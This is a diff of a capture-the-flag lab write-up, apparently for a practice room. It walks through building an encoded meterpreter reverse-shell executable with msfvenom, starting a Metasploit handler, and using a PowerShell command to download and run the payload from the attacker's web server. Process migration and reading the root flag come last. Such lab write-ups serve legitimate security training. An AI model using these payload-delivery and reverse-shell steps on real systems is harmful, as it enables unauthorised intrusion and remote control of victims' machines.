@@ -97,6 +97,7 @@ Task 2: Switching Shells
 
 - Using meterpreter to switch from nc shell to meterpreter
 - Using msfvenom exploit
+
 ```
 $ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.82.216 LPORT=8888 -f exe -o purple_drink.exe
 
@@ -109,12 +110,14 @@ Payload size: 381 bytes
 Final size of exe file: 73802 bytes         
 Saved as: purple_drink.exe
 ```
+
 - Next step is to use the previously gained shell to download and run this script
 - Run msf handler as well
 
 
 
 #### LINUX
+
 ```
 msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcppayload => windows/meterpreter/reverse_tcp
@@ -124,13 +127,17 @@ msf6 exploit(multi/handler) > set lport 8888
 lport => 8888
 msf6 exploit(multi/handler) > run
 ```
+
 #### Windows NC Shell
+
 ```
 PS C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.82.216:8000/purple_drink.exe', 'purple_drink.exe')"
 PS C:\Users\bruce\Desktop> Start-Process 'purple_drink.exe'
 PS C:\Users\bruce\Desktop> 
 ```
+
 ### LINUX
+
 ```
 [*] Started reverse TCP handler on 10.6.82.216:8888 
 [*] Sending stage (175174 bytes) to 10.10.242.101[*] Meterpreter session 1 opened (10.6.82.216:8888 -> 10.10.242.101:49264) at 2021-11-05 16:39:07 -0400
@@ -261,15 +268,25 @@ Process List
 ```
 
 ```
+
 meterpreter > migrate 668
+
 [*] Migrating from 2612 to 668...
+
 [*] Migration completed successfully.
+
 meterpreter >
+
 meterpreter > pwd
+
 C:\Windows\system32
+
 meterpreter > cd config
+
 meterpreter > cat root.txt
+
 dff0f{REDACTED}
+
 meterpreter > 
 ```
 
